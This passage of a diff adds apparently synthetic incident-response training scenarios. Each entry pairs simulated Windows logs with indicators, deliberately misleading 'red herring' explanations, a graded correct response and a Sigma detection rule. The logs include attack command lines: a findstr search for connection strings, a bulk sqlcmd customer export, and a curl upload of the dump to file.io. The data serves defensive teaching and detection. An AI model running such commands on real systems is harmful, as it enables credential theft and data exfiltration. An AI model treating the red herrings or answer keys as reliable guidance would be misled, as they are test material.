+                "ProcessId": "7910",
+                "Image": "C:\\Windows\\System32\\findstr.exe",
+                "OriginalFileName": "FINDSTR.EXE",
+                "CommandLine": "findstr connectionString",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "CommandLine reads web.config and filters for 'connectionString'",
+            "Security EID 4663 ReadData (0x1) on C:\\inetpub\\wwwroot\\web.config",
+            "Configuration file accessed by IIS APPPOOL\\DefaultAppPool via cmd.exe",
+            "findstr.exe launched as a child of the web shell command chain",
+            "Credential material searched for immediately after web shell deployment"
+          ],
+          "red_herring_indicators": [
+            "AccessMask: 0x1 (read access is non-destructive, no risk)",
+            "ObjectName ends with .config (routine configuration read)",
+            "Image: findstr.exe (a signed Microsoft utility, therefore benign)",
+            "SubjectLogonId: 0x3e5 (LOCAL SERVICE session, expected for IIS)"
+          ],
+          "correct_response_action": "Revoke Credentials",
+          "sigma_rule_yaml": "title: Detect Configuration File Credential Harvesting\nid: 6824d70e-d90b-4350-927c-9e4d1d3dbd77\nstatus: experimental\ndescription: Detects command line reads of application configuration files filtered for credential keywords, indicating credentials in files harvesting.\nreferences:\n  - https://attack.mitre.org/techniques/T1552/001/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_file:\n    CommandLine|contains:\n      - 'web.config'\n      - 'appsettings.json'\n      - 'unattend.xml'\n      - '.aws\\credentials'\n  selection_keyword:\n    CommandLine|contains:\n      - 'connectionString'\n      - 'password'\n      - 'findstr'\n      - 'Select-String'\n  selection_parent:\n    ParentImage|endswith:\n      - '\\w3wp.exe'\n      - '\\cmd.exe'\n      - '\\powershell.exe'\n  filter_admin:\n    User|contains: 'CORP\\svc_deploy'\n  condition: selection_file and selection_keyword and selection_parent and not filter_admin\nfalsepositives:\n  - Deployment scripts validating connection strings after release\nlevel: high\ntags:\n  - attack.credential_access\n  - attack.t1552.001\n"
+        },
+        {
+          "technique_id": "T1078",
+          "technique_name": "Valid Accounts",
+          "tactic": "Defense Evasion",
+          "description": "The harvested service account is replayed against the database server. Because the logon uses valid credentials it blends into normal authentication traffic, and the account is granted debug and ownership privileges it never needed.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 4624,
+              "timestamp": "2026-07-22T03:14:02.118Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-0-0",
+                "TargetUserName": "CORP\\svc_sqlreport",
+                "TargetDomainName": "CORP",
+                "TargetLogonId": "0xb14e77",
+                "LogonType": "3",
+                "LogonProcessName": "NtLmSsp",
+                "AuthenticationPackageName": "NTLM",
+                "WorkstationName": "WEB-EXT-11",
+                "LmPackageName": "NTLM V2",
+                "KeyLength": "128",
+                "IpAddress": "10.30.40.11",
+                "IpPort": "50942"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4672,
+              "timestamp": "2026-07-22T03:14:02.122Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-21-1194762330-4021884723-1907732297-3312",
+                "SubjectUserName": "svc_sqlreport",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0xb14e77",
+                "PrivilegeList": "SeDebugPrivilege SeTakeOwnershipPrivilege SeBackupPrivilege SeImpersonatePrivilege"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4624,
+              "timestamp": "2026-07-22T03:14:44.771Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "TargetUserName": "CORP\\svc_sqlreport",
+                "TargetDomainName": "CORP",
+                "TargetLogonId": "0xb15012",
+                "LogonType": "3",
+                "LogonProcessName": "NtLmSsp",
+                "AuthenticationPackageName": "NTLM",
+                "WorkstationName": "WEB-EXT-11",
+                "IpAddress": "10.30.40.11",
+                "IpPort": "50961"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Security EID 4624 LogonType: 3 using credentials recovered from web.config",
+            "TargetUserName: CORP\\svc_sqlreport authenticating from the DMZ web server",
+            "Security EID 4672 SeDebugPrivilege granted to a reporting service account",
+            "Logon occurred at 03:14, outside the account's normal baseline window",
+            "WorkstationName: WEB-EXT-11 is an internet-facing host, not an admin console"
+          ],
+          "red_herring_indicators": [
+            "AuthenticationPackageName: NTLM (an unsupported legacy protocol)",
+            "KeyLength: 128 (weak key negotiated, cryptographic downgrade)",
+            "TargetDomainName: CORP (logon crossed a domain trust boundary)",
+            "IpPort: 50942 (ephemeral source port indicates spoofing)"
+          ],
+          "correct_response_action": "Revoke Credentials",
+          "sigma_rule_yaml": "title: Detect Service Account Logon From DMZ Web Server\nid: 9ea2c9c5-3a54-4015-9c24-6d8265365357\nstatus: experimental\ndescription: Detects service account network logons sourced from internet-facing web servers, a strong signal of stolen credential reuse after web compromise.\nreferences:\n  - https://attack.mitre.org/techniques/T1078/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4624\n    LogonType: 3\n    TargetUserName|startswith: 'CORP\\svc_'\n    WorkstationName|startswith:\n      - 'WEB-EXT-'\n      - 'WEB-DMZ-'\n  selection_priv:\n    EventID: 4672\n    PrivilegeList|contains: 'SeDebugPrivilege'\n  filter_healthcheck:\n    TargetUserName: 'CORP\\svc_monitor'\n  condition: (selection or selection_priv) and not filter_healthcheck\nfalsepositives:\n  - Application pools configured to reach internal services with a domain identity\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.persistence\n  - attack.t1078\n"
+        },
+        {
+          "technique_id": "T1005",
+          "technique_name": "Data from Local System",
+          "tactic": "Collection",
+          "description": "Using the stolen service account the actor runs sqlcmd against the local database instance and stages the entire customer table as a CSV in a temporary directory.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-22T03:17:55.208Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::database-client",
+                "UtcTime": "2026-07-22 03:17:55.208",
+                "ProcessId": "3308",
+                "Image": "C:\\Windows\\System32\\sqlcmd.exe",
+                "OriginalFileName": "sqlcmd.exe",
+                "CommandLine": "sqlcmd -S localhost -U db_admin -P ******** -Q \"SELECT * FROM dbo.customers INTO OUTFILE 'C:\\Temp\\dump.csv'\"",
+                "CurrentDirectory": "C:\\Temp\\",
+                "User": "CORP\\svc_sqlreport",
+                "IntegrityLevel": "High",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "ParentCommandLine": "cmd.exe /c sqlcmd -S localhost -U db_admin -P ******** -Q \"SELECT * FROM dbo.customers\""
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4663,
+              "timestamp": "2026-07-22T03:17:57.640Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-21-1194762330-4021884723-1907732297-3312",
+                "SubjectUserName": "svc_sqlreport",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0xb14e77",
+                "ObjectServer": "Security",
+                "ObjectType": "File",
+                "ObjectName": "C:\\Temp\\dump.csv",
+                "HandleId": "0x7d0",
+                "AccessMask": "0x2",
+                "AccessList": "%%4417",
+                "ProcessName": "C:\\Windows\\System32\\sqlcmd.exe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-22T03:17:57.644Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-22 03:17:57.644",
+                "ProcessId": "3308",
+                "Image": "C:\\Windows\\System32\\sqlcmd.exe",
+                "TargetFilename": "C:\\Temp\\dump.csv",
+                "CreationUtcTime": "2026-07-22 03:17:57.644",
+                "User": "CORP\\svc_sqlreport"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "CommandLine contains 'SELECT * FROM dbo.customers' (bulk table read)",
+            "Plaintext credentials passed on the sqlcmd command line via -U and -P",
+            "Security EID 4663 WriteData (0x2) creating C:\\Temp\\dump.csv",
+            "Database export written to a non-standard staging directory",
+            "sqlcmd.exe executed under svc_sqlreport by a cmd.exe parent, not an agent job"
+          ],
+          "red_herring_indicators": [
+            "Image: sqlcmd.exe (a legitimate Microsoft SQL utility, therefore benign)",
+            "ObjectName: C:\\Temp\\dump.csv (temporary directory usage is routine)",
+            "IntegrityLevel: High (SQL tooling always runs elevated)",
+            "CurrentDirectory: C:\\Temp\\ (default working directory for sqlcmd)"
+          ],
+          "correct_response_action": "Kill Process",
+          "sigma_rule_yaml": "title: Detect Bulk Database Export To Local Staging File\nid: 449c777e-530e-4326-afb4-21a9204e9f7b\nstatus: experimental\ndescription: Detects command line database clients performing unbounded table selects redirected to a local file, indicating collection of local system data.\nreferences:\n  - https://attack.mitre.org/techniques/T1005/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_tool:\n    Image|endswith:\n      - '\\sqlcmd.exe'\n      - '\\bcp.exe'\n      - '\\osql.exe'\n      - '\\mysql.exe'\n  selection_query:\n    CommandLine|contains:\n      - 'SELECT * FROM'\n      - 'INTO OUTFILE'\n      - 'bcp '\n  selection_output:\n    CommandLine|contains:\n      - 'C:\\Temp\\'\n      - '\\AppData\\Local\\Temp\\'\n      - 'C:\\Users\\Public\\'\n      - '.csv'\n  filter_agent:\n    ParentImage|endswith: '\\sqlagent.exe'\n  condition: selection_tool and selection_query and selection_output and not filter_agent\nfalsepositives:\n  - Scheduled reporting exports run by database administrators\nlevel: high\ntags:\n  - attack.collection\n  - attack.t1005\n"
+        },
+        {
+          "technique_id": "T1048.003",
+          "technique_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+          "tactic": "Exfiltration",
+          "description": "The staged CSV is uploaded with the built-in curl client to a public file-sharing service, deliberately separate from any command and control channel so that C2 blocking alone would not stop the data loss.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-22T03:22:10.554Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::file-transfer-utility",
+                "UtcTime": "2026-07-22 03:22:10.554",
+                "ProcessId": "4188",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "OriginalFileName": "curl.exe",
+                "CommandLine": "curl.exe -T C:\\Temp\\dump.csv https://file.io/upload -H \"Authorization: Bearer tok_9f2k1lmn\"",
+                "CurrentDirectory": "C:\\Temp\\",
+                "User": "CORP\\svc_sqlreport",
+                "IntegrityLevel": "High",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "ParentCommandLine": "cmd.exe /c curl.exe -T C:\\Temp\\dump.csv https://file.io/upload"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-22T03:22:10.998Z",
+              "computer": "SQL-CORP-03.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-22 03:22:10.998",
+                "ProcessId": "4188",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "User": "CORP\\svc_sqlreport",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.40.50.22",
+                "SourcePort": "51330",
+                "DestinationIp": "45.33.32.156",
+                "DestinationPort": "443",
+                "DestinationHostname": "file.io"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "curl.exe uploading C:\\Temp\\dump.csv with the -T (file transfer) flag",
+            "DestinationHostname file.io is an unapproved public file-sharing service",
+            "Sysmon EID 3 curl.exe connecting outbound to 45.33.32.156:443",
+            "Bearer token embedded in the command line for a third-party upload API",
+            "Exfiltration channel is distinct from any established C2 session"
+          ],
+          "red_herring_indicators": [
+            "DestinationPort: 443 (encrypted transport, therefore trusted)",
+            "Image: curl.exe (built into Windows since 1803, always benign)",
+            "IntegrityLevel: High (required for any network client)",
+            "SourceIp: 10.40.50.22 (RFC1918 address, traffic never left the network)"
+          ],
+          "correct_response_action": "Block IP/Domain",
+          "sigma_rule_yaml": "title: Detect File Upload To Public Sharing Service via curl\nid: 5d042ae2-348c-4b6e-bc13-10e34918056a\nstatus: experimental\ndescription: Detects the built-in curl client uploading local files to known public file sharing services, indicating exfiltration over an alternative non-C2 protocol.\nreferences:\n  - https://attack.mitre.org/techniques/T1048/003/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_tool:\n    Image|endswith:\n      - '\\curl.exe'\n      - '\\wget.exe'\n  selection_upload:\n    CommandLine|contains:\n      - ' -T '\n      - ' --upload-file'\n      - ' -F file@'\n  selection_dest:\n    CommandLine|contains:\n      - 'file.io'\n      - 'transfer.sh'\n      - 'anonfiles.com'\n      - 'pastebin.com'\n      - 'temp.sh'\n  filter_internal:\n    CommandLine|contains: 'https://artifacts.corp.internal'\n  condition: selection_tool and selection_upload and selection_dest and not filter_internal\nfalsepositives:\n  - Developers sharing build artefacts through public paste services\nlevel: critical\ntags:\n  - attack.exfiltration\n  - attack.t1048.003\n"
+        }
+      ]
+    }
+  ]
+}
